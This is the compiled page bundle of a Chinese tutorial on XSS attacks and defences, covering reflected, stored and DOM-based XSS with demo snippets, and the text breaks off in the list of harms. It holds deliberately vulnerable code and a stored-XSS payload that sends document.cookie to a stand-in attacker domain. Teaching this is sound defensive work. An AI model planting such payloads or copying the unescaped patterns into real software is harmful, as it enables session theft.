(window.webpackJsonp=window.webpackJsonp||[]).push([[17],{435:function(t,s,a){t.exports=a.p+"assets/img/wxm.1ea3fe37.png"},535:function(t,s,a){t.exports=a.p+"assets/img/tupu.94476418.png"},575:function(t,s,a){"use strict";a.r(s);var n=a(6),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("p",[n("strong",[t._v("看完了,发现对你有用的话，点个赞哈")])]),t._v(" "),n("h2",{attrs:{id:"java-最新xss攻击与防护-全方位360°详解"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#java-最新xss攻击与防护-全方位360°详解"}},[t._v("#")]),t._v(" java 最新Xss攻击与防护(全方位360°详解)")]),t._v(" "),n("hr"),t._v(" "),n("h2",{attrs:{id:"知识图谱"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#知识图谱"}},[t._v("#")]),t._v(" 知识图谱")]),t._v(" "),n("p",[n("img",{attrs:{src:a(535),alt:"tupu"}})]),t._v(" "),n("h2",{attrs:{id:"前沿"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#前沿"}},[t._v("#")]),t._v(" 前沿")]),t._v(" "),n("p",[t._v("XSS防范属于前端还是后端的责任 ?")]),t._v(" "),n("ol",[n("li",[t._v("XSS 防范是后端 RD（研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。")]),t._v(" "),n("li",[t._v("所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。")]),t._v(" "),n("li",[t._v("公司的搜索页面如果你是下面的写法。那么他可能存在Xss注入")])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("<%= getParameter("),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v('keyword")')]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("%")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('">\n'),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("button")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("搜索"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("button")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('\n  您搜索的关键词是：<%= getParameter("keyword") %>\n'),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br")])]),n("h2",{attrs:{id:"_1-什么是xss攻击"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_1-什么是xss攻击"}},[t._v("#")]),t._v(" 1. 什么是xss攻击？")]),t._v(" "),n("p",[n("strong",[t._v("Xss 即（Cross Site Scripting）中文名称为：跨站脚本攻击。"),n("strong",[t._v("XSS的重点不在于跨站点，而在于")]),t._v("脚本的执行")]),t._v("。")]),t._v(" "),n("h3",{attrs:{id:"_1-1-原理"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_1-1-原理"}},[t._v("#")]),t._v(" 1.1 原理")]),t._v(" "),n("p",[t._v("恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。")]),t._v(" "),n("h3",{attrs:{id:"_1-2-分类"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_1-2-分类"}},[t._v("#")]),t._v(" 1.2 分类")]),t._v(" "),n("p",[t._v("Xss攻击最主要有如下分类："),n("strong",[t._v("反射型Xss(非持久型)、存储型Xss(持久型)和DOM Xss。")])]),t._v(" "),n("h4",{attrs:{id:"_1-2-1-反射型xss-了解"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_1-2-1-反射型xss-了解"}},[t._v("#")]),t._v(" 1.2.1 反射型Xss(了解)")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("原理")]),t._v(" "),n("p",[n("strong",[t._v("反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行")]),t._v("。")])]),t._v(" "),n("li",[n("p",[t._v("步骤")])])]),t._v(" "),n("ol",[n("li",[t._v("攻击者在url后面的参数中加入恶意攻击代码。")]),t._v(" "),n("li",[t._v("当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。")]),t._v(" "),n("li",[t._v("用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。")]),t._v(" "),n("li",[t._v("攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。"),n("strong",[t._v("攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户的行为，调用目标网站接口执行攻击等操作。")])])]),t._v(" "),n("ul",[n("li",[t._v("演示")])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("title")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("csrf攻击"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("title")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n\n"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("a")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("href")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://localhost:3001/xss"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("xxs 攻击"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("a")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("a")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("href")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://localhost:3001/testcookie"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("testcookie 攻击"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("a")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br")])]),n("div",{staticClass:"language-js line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-js"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//第一个链接 可以弹出指定的弹窗")]),t._v("\nrouter"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("get")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'/xss'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("ctx"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" next")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=>")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  ctx"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("body "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'<script>alert(\"反射型 XSS 攻击\")<\/script>'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//获取当前的所有cookie")]),t._v("\nrouter"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("get")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'/testcookie'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("ctx"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" next")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=>")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  console"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("log")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("ctx"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookies"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("get")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'connect.sid'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  ctx"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("body "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'<script>alert(\"'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("ctx"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookies"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("get")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'connect.sid'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\")<\/script>'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("next")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br")])]),n("h4",{attrs:{id:"_1-2-2-存储型xss-了解"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_1-2-2-存储型xss-了解"}},[t._v("#")]),t._v(" 1.2.2 存储型Xss(了解)")]),t._v(" "),n("ul",[n("li",[t._v("原理")])]),t._v(" "),n("p",[n("strong",[t._v("主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。")])]),t._v(" "),n("ul",[n("li",[t._v("场景")])]),t._v(" "),n("p",[t._v("比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下："),n("script",[t._v("window.open(&quot;www.gongji.com?param=&quot;+document.cookie)")]),t._v(" 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。")]),t._v(" "),n("ul",[n("li",[t._v("步骤")])]),t._v(" "),n("ol",[n("li",[t._v("攻击者将恶意代码提交到目标网站数据库中。")]),t._v(" "),n("li",[t._v("用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。")]),t._v(" "),n("li",[t._v("用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。")]),t._v(" "),n("li",[t._v("那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该\ncookie然后会冒充该用户的行为，调用目标网站接口等违法操作。")])]),t._v(" "),n("h4",{attrs:{id:"_1-2-3-dom-based型xss-了解"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_1-2-3-dom-based型xss-了解"}},[t._v("#")]),t._v(" 1.2.3 DOM-based型Xss(了解)")]),t._v(" "),n("ul",[n("li",[t._v("原理")])]),t._v(" "),n("p",[t._v("我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。比如说"),n("strong",[t._v("客户端从URL中提取数据并且在本地执行")]),t._v("、如果"),n("strong",[t._v("用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based Xss的攻击")]),t._v("。")]),t._v(" "),n("ul",[n("li",[t._v("步骤")])]),t._v(" "),n("ol",[n("li",[t._v("攻击者构造出特殊的URL、在其中可能包含恶意代码。")]),t._v(" "),n("li",[t._v("用户打开带有恶意代码的URL。")]),t._v(" "),n("li",[t._v("用户浏览器收到响应后解析执行。前端使用js取出url中的恶意代码并执行。")]),t._v(" "),n("li",[t._v("执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口\n执行攻击者一些操作。")])]),t._v(" "),n("ul",[n("li",[n("p",[t._v("攻击代码")])]),t._v(" "),n("li",[n("p",[n("strong",[t._v("使用document.write直接输出导致浏览器解析恶意代码")])])]),t._v(" "),n("li",[n("p",[n("strong",[t._v("使用innerHTML直接输出导致浏览器解析恶意代码")])])]),t._v(" "),n("li",[n("p",[n("strong",[t._v("使用location/location.href/location.replace/iframe.src 造成的XSS")])])])]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text/javascript"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),n("span",{pre:!0,attrs:{class:"token script"}},[n("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" s "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" location"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("search"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("            "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 返回URL中的查询部分（？之后的内容）")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 为了方便演示，我们假如url是 如下这样的")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); ")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 然后我们的是 s 的值就为如下：")]),t._v("\n    s "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"?url=javascript:alert('xsstest')\"")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    s "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" s"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("substring")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" s"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("length"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("       "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 返回整个查询内容")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" url "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("                       "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 定义变量url")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("s"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("indexOf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"url="')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("       "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 判断URL是否为空 ")]),t._v("\n      "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" pos "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" s"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("indexOf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"url="')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("  "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v('// 过滤掉"url="字符')]),t._v("\n      url "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" s"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("substring")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pos"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" s"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("length"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("  "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 得到地址栏里的url参数")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n      url "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"url参数为空"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    document"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'url: <a href=\"'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" url "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\">\"'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" url "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\"</a>'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" \n")])]),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br"),n("span",{staticClass:"line-number"},[t._v("15")]),n("br"),n("span",{staticClass:"line-number"},[t._v("16")]),n("br")])]),n("h2",{attrs:{id:"_2-xss有什么危害"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_2-xss有什么危害"}},[t._v("#")]),t._v(" 2. Xss有什么危害？")]),t._v(" "),n("h3",{attrs:{id:"_2-1-劫持访问"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_2-1-劫持访问"}},[t._v("#")]),t._v(" 2.1 劫持访问")]),t._v(" "),n("p",[t._v("劫持访问就是在恶意脚本中插入诸如的代码，那么页面就会跳转到百度首页.像http://qq.com这样的域名下出现非持久型XSS，那么在发送钓鱼链接时就可以通过"),n("a",{attrs:{href:"https://link.zhihu.com/?target=http%3A//qq.com",target:"_blank",rel:"noopener noreferrer"}},[t._v("http://qq.com"),n("OutboundLink")],1),t._v("等域名进行跳转，一般人一看到"),n("a",{attrs:{href:"https://link.zhihu.com/?target=http%3A//qq.com",target:"_blank",rel:"noopener noreferrer"}},[t._v("http://qq.com"),n("OutboundLink")],1),t._v("之类的域名警惕性会下降，也就更容易上当了。")]),t._v(" "),n("h3",{attrs:{id:"_2-2-盗用cookie实现无密码登录"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_2-2-盗用cookie实现无密码登录"}},[t._v("#")]),t._v(" 2.2 盗用cookie实现无密码登录")]),t._v(" "),n("p",[t._v("由于盗取的cookie需要传回给攻击者，因此往往需要一个服务器来接收盗取的cookie。")]),t._v(" "),n("h3",{attrs:{id:"_2-3-配合csrf攻击完成恶意请求"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_2-3-配合csrf攻击完成恶意请求"}},[t._v("#")]),t._v(" 2.3 配合csrf攻击完成恶意请求")]),t._v(" "),n("p",[t._v("Csrf攻击就是在未经你许可的情况下用你的名义发送恶意请求（比如修改密码，银行转账等）")]),t._v(" "),n("h3",{attrs:{id:"_2-4-其他危害"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_2-4-其他危害"}},[t._v("#")]),t._v(" 2.4 其他危害")]),t._v(" "),n("ol",[n("li",[t._v("DOS（拒绝服务）客户端浏览器。")]),t._v(" "),n("li",[t._v("挂马")]),t._v(" 